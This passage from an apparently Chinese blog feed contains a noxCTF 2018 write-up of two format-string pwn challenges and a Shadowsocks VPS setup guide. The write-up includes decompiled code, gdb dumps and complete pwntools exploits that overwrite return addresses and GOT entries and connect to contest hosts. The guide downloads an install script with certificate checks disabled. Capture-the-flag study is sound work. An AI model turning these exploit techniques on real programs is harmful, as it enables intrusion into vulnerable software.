class="number">-1</span>; i = fgetc(stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(i);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Can't read file \n"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于题目中提到环境是不开启ASLR的，那么这道题的思路就很明确：通过格式化字符串，泄漏出main函数ret的地址，修改为<code>noxFlag</code>的地址，得到<code>flag.txt</code>的内容。</p><p>gdb调试，通过查看栈上的内容得到字符串的offset：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)</span><br><span class="line">0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\n&apos;)</span><br><span class="line">0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad2288 </span><br><span class="line">0012| 0xffffcebc --&gt; 0x7f17 </span><br><span class="line">0016| 0xffffcec0 --&gt; 0xffffffff </span><br><span class="line">0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)</span><br><span class="line">0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)</span><br><span class="line">0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)</span><br><span class="line">0032| 0xffffced0 --&gt; 0x8000 </span><br><span class="line">0036| 0xffffced4 (&quot;AAAA&quot;)</span><br></pre></td></tr></table></figure><p>关于ret的地址，也通过在栈上的观察：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x1 </span><br><span class="line">0088| 0xffffce98 --&gt; 0x0 </span><br><span class="line">0092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 </span><br><span class="line">--More--(25/50)</span><br><span class="line">0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 </span><br><span class="line">0104| 0xffffcea8 --&gt; 0x0 </span><br><span class="line">0108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;:add    esp,0x10)</span><br><span class="line">0112| 0xffffceb0 --&gt; 0x1</span><br></pre></td></tr></table></figure><p>可以看到本地ret的地址即为<code>0xffffceac</code>，然后需要利用漏洞，泄漏出远程的地址。仔细观察发现offset为84和112处的联系，即只需要泄漏出offset为84的内容，再将结果减去4即能得到远程服务器上ret的地址。</p><p>格式化字符串漏洞的payload还可以利用<code>pwntools</code>中的一个函数<code>fmtstr_payload</code>，用于自动生成格式化字符串。<code>fmtstr_payload</code>有三个参数：第一个参数是<code>int</code>，用于表示取参数的偏移个数；第二个参数是字典，字典的意义是往<code>key</code>的地址，写入<code>value</code>的值；第三个参数<code>write_size</code>，可以改变payload的形式，<code>byte</code>对应<code>%hhn</code>，<code>short</code>对应<code>%hn</code>，<code>int</code>对应<code>%n</code>。</p><p>最后可以写出exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./believeMe'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'18.223.228.52'</span>, <span class="number">13337</span>)</span><br><span class="line">flag_addr = <span class="number">0x0804867B</span></span><br><span class="line">ret_addr = <span class="number">0xffffdd2c</span> <span class="comment"># local: 0xffffd2bc</span></span><br><span class="line">offset = <span class="number">9</span></span><br><span class="line"><span class="comment"># payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset</span></span><br><span class="line"><span class="comment"># payload = '0x%21$08x' # test ret_addr</span></span><br><span class="line"><span class="comment"># payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size=<span class="string">'short'</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(payload) &lt; <span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'????'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x80487d3\nc')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="PWN-The-Name-Calculator"><a href="#PWN-The-Name-Calculator" class="headerlink" title="PWN-The Name Calculator"></a>PWN-The Name Calculator</h1><p>又是一道格式化字符串，还涉及到栈溢出。先反编译查看main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>u);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">0x6A4B825</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    secretFunc();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I've heard better"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看一下v4和buf在内存中的位置，发现可以溢出进入<code>secretFunc</code>，看一下这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">secretFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *i; <span class="comment">// [esp+8h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v3; <span class="comment">// [esp+18h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [esp+4Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    buf[v0] = <span class="number">0</span>;</span><br><span class="line">    ++v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">7</span> );</span><br><span class="line">  retAddr = (<span class="keyword">int</span>)retaddr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Say that again please"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, buf, <span class="number">0x1B</span>u);</span><br><span class="line">  *((_BYTE *)buf + v3) = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = buf; i &lt; (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;buf[<span class="number">-1</span>] + v3); i = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)i + <span class="number">1</span>) )</span><br><span class="line">    *i ^= <span class="number">0x5F7B4153</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Your name was encrypted using the best encryption in the world"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your new name: "</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( retaddr != (<span class="keyword">void</span> *)retAddr )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间对输入的buf进行了异或，从第一字符开始，步长为1，每次取四个字符，转换为int型后与特定数字异或，循环直到倒数第四个字符。后面buf这里的<code>printf</code>明显存在格式化字符串。然后又发现了一个<code>superSecretFunc</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">superSecretFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is your flag: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概知道了是通过格式化字符串修改某个ret的地址，然后在<code>superSecretFunc</code>这里执行<code>cat flag</code>。回头再看到main函数调用了<code>exit</code>，这里就可以通过修改<code>exit</code>的got表实现跳转。然后先通过gdb调试找到地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pdis exit</span><br><span class="line">Dump of assembler code for function exit@plt:</span><br><span class="line">   0x08048470 &lt;+0&gt;:jmp    DWORD PTR ds:0x804a024</span><br><span class="line">   0x08048476 &lt;+6&gt;:push   0x30</span><br><span class="line">   0x0804847b &lt;+11&gt;:jmp    0x8048400</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x/wx 0x804a024</span><br><span class="line">0x804a024:0x08048476</span><br></pre></td></tr></table></figure><p>查看栈上分布，得到字符串的偏移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0008| 0xffbc27e8 --&gt; 0x1b </span><br><span class="line">0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;:add    esp,0x10)</span><br><span class="line">0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;:add    esi,0x149e29)</span><br><span class="line">0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db0 </span><br><span class="line">0024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br><span class="line">0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;:jmp    0x80487bd &lt;main+147&gt;)</span><br><span class="line">0032| 0xffbc2800 (&quot;SA&#123;_&quot;)</span><br><span class="line">0036| 0xffbc2804 --&gt; 0x0 </span><br><span class="line">0040| 0xffbc2808 --&gt; 0x2 </span><br><span class="line">0044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db0 </span><br><span class="line">0048| 0xffbc2810 --&gt; 0xa0a (&apos;\n\n&apos;)</span><br></pre></td></tr></table></figure><p>最后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./CAL'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'chal.noxale.com'</span>, <span class="number">5678</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_op</span><span class="params">(s)</span>:</span></span><br><span class="line">xor_num = <span class="number">0x5F7B4153</span></span><br><span class="line">l = list(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(l) - <span class="number">4</span>):</span><br><span class="line">t = <span class="string">''</span>.join(l[i:i + <span class="number">4</span>])</span><br><span class="line">l[i:i + <span class="number">4</span>] = list(p32(u32(t) ^ xor_num))</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(l)</span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">28</span></span><br><span class="line">v4 = <span class="number">0x6A4B825</span></span><br><span class="line">offset2 = <span class="number">12</span></span><br><span class="line">exit_got = <span class="number">0x804a024</span></span><br><span class="line">super_addr = <span class="number">0x08048596</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x8048656')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload1 = <span class="string">'A'</span> * offset1 + p32(v4)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'please'</span>)</span><br><span class="line">payload2 = xor_op(p32(exit_got) + <span class="string">'%34194c%12$hn'</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(payload2) &lt; <span class="number">0x1B</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String" target="_blank" rel="noopener">https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-String</a><br><a href="https://github.com/imthoe/noxCTF/tree/master/BlindDate" target="_blank" rel="noopener">https://github.com/imthoe/noxCTF/tree/master/BlindDate</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/</a><br><a href="https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/" target="_blank" rel="noopener">https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录几道简单题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>利用VPS搭建Shadowsocks科学上网</title>
    <link href="https://qianfei11.github.io/2018/09/08/%E5%88%A9%E7%94%A8VPS%E6%90%AD%E5%BB%BAShadowsocks%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <id>https://qianfei11.github.io/2018/09/08/利用VPS搭建Shadowsocks科学上网/</id>
    <published>2018-09-08T03:37:55.000Z</published>
    <updated>2018-09-24T10:35:13.984Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下自己搭小飞机的过程。</p><a id="more"></a><h1 id="第一步-租服务器"><a href="#第一步-租服务器" class="headerlink" title="第一步-租服务器"></a>第一步-租服务器</h1><p>先放一些国外的一些VPS提供商：<a href="https://www.vultr.com/" target="_blank" rel="noopener">vultr</a>、<a href="https://www.linode.com/" target="_blank" rel="noopener">linode</a>、<a href="https://bwh1.net/" target="_blank" rel="noopener">搬瓦工</a>。我是在vultr上租的服务器。</p><p>首先注册账号，进入个人界面后，在Billing页面使用Alipay充值。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/1.png" alt="Alipay充值"></p><p>去Servers页面，选择服务器的地点，我选了Los Angeles。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/2.png" alt="选择地点"></p><p>然后选择os，我的话选了CentOS。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/3.png" alt="选择操作系统"></p><p>然后Size我是选了$3.5/mo，因为最便宜的$2.5/mo只支持ipv6。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/4.png" alt="选择服务器大小"></p><p>然后点击Deploy Now，过一会儿就可以得到这台服务器的基本信息。</p><h1 id="第二步-ssh远程连接"><a href="#第二步-ssh远程连接" class="headerlink" title="第二步-ssh远程连接"></a>第二步-ssh远程连接</h1><p>mac的话我是用的SSH Shell来连，如果是windows可以用Putty。</p><p>按照给出的信息连一下就行了（端口22）。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/5.png" alt="ssh连接成功"></p><h1 id="第三步-搭建"><a href="#第三步-搭建" class="headerlink" title="第三步-搭建"></a>第三步-搭建</h1><p>在服务器上运行一下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</span><br><span class="line">chmod +x shadowsocks-all.sh</span><br><span class="line">./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log</span><br></pre></td></tr></table></figure><p>然后按照提示选择脚本，我选了Shadowsocks-Go，之后也是无脑跟着指令一步一步进行，安装完成后就会得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting shadowsocks-go (via systemctl):  [  OK  ]</span><br><span class="line"></span><br><span class="line">Congratulations, Shadowsocks-Go server install completed!</span><br><span class="line"></span><br><span class="line">Your Server IP        :  xxx.xxx.xxx.xxx</span><br><span class="line">Your Server Port      :  xxxxx</span><br><span class="line">Your Password         :  xxxxxxxxxxx     </span><br><span class="line">Your Encryption Method:  xxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Your QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients)</span><br><span class="line"> ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=</span><br><span class="line">Your QR Code has been saved as a PNG file path:    </span><br><span class="line"> /root/shadowsocks_go_qr.png</span><br><span class="line"></span><br><span class="line">Welcome to visit: https://teddysun.com/486.html</span><br><span class="line">Enjoy it!</span><br></pre></td></tr></table></figure><h1 id="第四步-科学上网"><a href="#第四步-科学上网" class="headerlink" title="第四步-科学上网"></a>第四步-科学上网</h1><p>我把每个平台上的小飞机都放在<a href="https://github.com/qianfei11/Flight" target="_blank" rel="noopener">我的github上</a>了。只要将上面的信息填进去就能科学上网啦。</p><p><img src="/pics/利用VPS搭建Shadowsocks科学上网/6.png" alt="hello world"></p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.diycode.cc/topics/738" target="_blank" rel="noopener">https://www.diycode.cc/topics/738</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下自己搭小飞机的过程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="note" scheme="https://qianfei11.github.io/tags/note/"/>
    
  </entry>
  
</feed>
